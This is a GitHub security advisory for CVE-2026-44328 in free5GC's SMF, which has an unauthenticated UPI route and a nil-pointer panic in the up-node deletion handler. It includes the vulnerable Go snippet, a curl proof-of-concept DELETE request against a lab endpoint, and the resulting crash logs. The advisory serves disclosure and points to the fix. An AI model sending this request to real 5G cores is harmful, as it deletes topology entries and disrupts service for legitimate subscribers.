# [H] free5GC's SMF UPI DELETE /upi/v1/upNodesLinks/{ref} panics on AN-node deletion via nil UPF dereference; unauthenticated, state-mutating

## Summary
Severity: High
Advisory: GHSA-p9mg-74mg-cwwr
CVE: CVE-2026-44328
CWE: CWE-306, CWE-476, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-p9mg-74mg-cwwr
Type: github-advisory

## Affected
- Go: `github.com/free5gc/smf` — affected >=0 <1.4.3

## Details
### Summary
free5GC's SMF mounts the `UPI` management route group without inbound OAuth2 middleware (same root cause as the broader UPI auth gap reported in free5gc/free5gc#887). On top of that, the `DELETE /upi/v1/upNodesLinks/{upNodeRef}` handler unconditionally dereferences `upNode.UPF` after the type-guarded async release, even though `AN`-typed nodes are constructed without a `UPF` object. As a result, a single unauthenticated `DELETE /upi/v1/upNodesLinks/gNB1` request crashes the handler with a nil-pointer panic AND mutates the in-memory user-plane topology before panicking (the `UpNodeDelete(upNodeRef)` line runs first). This is an unauthenticated, state-mutating panic-DoS sink that an off-path network attacker can trigger by name against any AN entry.

### Details
Validated against the SMF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/smf:v4.2.1`
- Runtime SMF commit: `8385c00a`
- Docker validation date: 2026-03-22 local (container log timestamp `2026-03-21T23:43:17Z`)
- SMF endpoint: `http://10.100.200.6:8000`

Control comparison on the same SMF instance:
- `GET /nsmf-oam/v1/` (no token) -> `401 Unauthorized`
- `DELETE /upi/v1/upNodesLinks/gNB1` (no token) -> `500 Internal Server Error` (panic)

The sibling `nsmf-oam` returning `401` proves OAuth middleware IS wired in for other SMF route groups; the UPI group specifically is mounted without it.

Vulnerable handler logic (paths in `free5gc/smf`):
```go
// NFs/smf/internal/sbi/api_upi.go:94..99
if upNode.Type == smf_context.UPNODE_UPF {
    go s.Processor().ReleaseAllResourcesOfUPF(upNode.UPF)
}
upi.UpNodeDelete(upNodeRef)
upNode.UPF.CancelAssociation()   // <-- panics for AN-typed nodes; nil UPF
```

The `Type == UPNODE_UPF` guard only protects the asynchronous `ReleaseAllResourcesOfUPF` call. After that, `UpNodeDelete(upNodeRef)` runs unconditionally (so the topology mutation lands first), and then `upNode.UPF.CancelAssociation()` is called unconditionally on a `*UPF` that is `nil` for `AN` nodes by construction.

Code evidence:
- UPI group mounted WITHOUT auth middleware:
  - `NFs/smf/internal/sbi/server.go:76`
  - `NFs/smf/internal/sbi/server.go:78`
- Protected control comparison (other SMF groups DO use auth):
  - `NFs/smf/internal/sbi/server.go:99`
  - `NFs/smf/internal/sbi/server.go:105`
- Delete handler (panic site):
  - `NFs/smf/internal/sbi/api_upi.go:94`
  - `NFs/smf/internal/sbi/api_upi.go:99`
- AN nodes are constructed without a UPF object (root cause of the nil deref):
  - `NFs/smf/internal/context/user_plane_information.go:95`
  - `NFs/smf/internal/context/user_plane_information.go:97`

### PoC
Reproduced end-to-end against the running SMF at `http://10.100.200.6:8000`.

1. Control: protected sibling OAM route returns `401`:
```
curl -i http://10.100.200.6:8000/nsmf-oam/v1/
```
```
HTTP/1.1 401 Unauthorized
```

2. Trigger: unauthenticated DELETE on the default AN node `gNB1`:
```
curl -i -X DELETE http://10.100.200.6:8000/upi/v1/upNodesLinks/gNB1
```
```
HTTP/1.1 500 Internal Server Error
```

3. SMF container logs (`docker logs --tail 120 smf`) show topology mutation landing BEFORE the panic, and the panic stack pointing at `api_upi.go:99`:
```
[INFO][SMF][Init] UPNode [gNB1] found. Deleting it.
[INFO][SMF][Init] Delete UPLink [UPF] <=> [gNB1].
[ERRO][SMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/smf/internal/sbi.(*Server).DeleteUpNodeLink
    /go/src/free5gc/NFs/smf/internal/sbi/api_upi.go:99 +0x298
[INFO][SMF][GIN] | 500 | DELETE | /upi/v1/upNodesLinks/gNB1
```

The lab state was manually restored after validation by re-creating the AN entry; that POST is restoration-only and is NOT a mitigation.

### Impact
Three compounding defects on the same SMF SBI surface:
1. Missing inbound authentication (CWE-306) and authorization (CWE-862) on the `UPI` route group, so the trigger is reachable to any off-path network attacker who can reach SMF on the SBI -- no token, no session, no UE state needed. The same-instance `nsmf-oam` returning `401` proves the middleware is wired in elsewhere and only missing on UPI.
2. NULL pointer dereference (CWE-476) in `DeleteUpNodeLink`: the `Type == UPNODE_UPF` guard only covers the async release call, then `upNode.UPF.CancelAssociation()` runs unconditionally on AN-typed nodes that have a nil `UPF` field by construction.
3. Order of operations (CWE-755 / CWE-754): `UpNodeDelete(upNodeRef)` mutates the in-memory user-plane topology BEFORE the dereference panics, so the topology change lands even though the request returns 500. This makes the bug state-mutating, not just a plain panic.

Any party that can reach SMF on the SBI can:
- Delete arbitrary named entries (e.g. `gNB1`) from SMF's in-memory user-plane topology anonymously via a single `DELETE /upi/v1/upNodesLinks/{ref}` request, denying SMF's ability to consider that AN/UPF in subsequent UPF selection / PFCP path establishment for legitimate UE sessions.
- Trigger a panic on the SMF goroutine for the deleted-AN case, even though Gin recovers the goroutine, leaving the topology in the mutated state above.
- Repeat the trigger by name against any AN entry, sustaining the topology denial without ever authenticating.

This is a strict superset of the impact in free5gc/free5gc#887 for this specific code path: same auth bypass, plus a concrete request-triggerable nil deref, plus state mutation that survives the panic.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/905
Upstream fix: https://github.com/free5gc/smf/pull/199

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-p9mg-74mg-cwwr
- https://nvd.nist.gov/vuln/detail/CVE-2026-44328
- https://github.com/free5gc/free5gc/issues/905
- https://github.com/free5gc/smf/pull/199
- https://github.com/free5gc/smf/commit/b57bc48081c3d3a2f333d02eb78e4fd31a120deb
- https://github.com/free5gc/free5gc
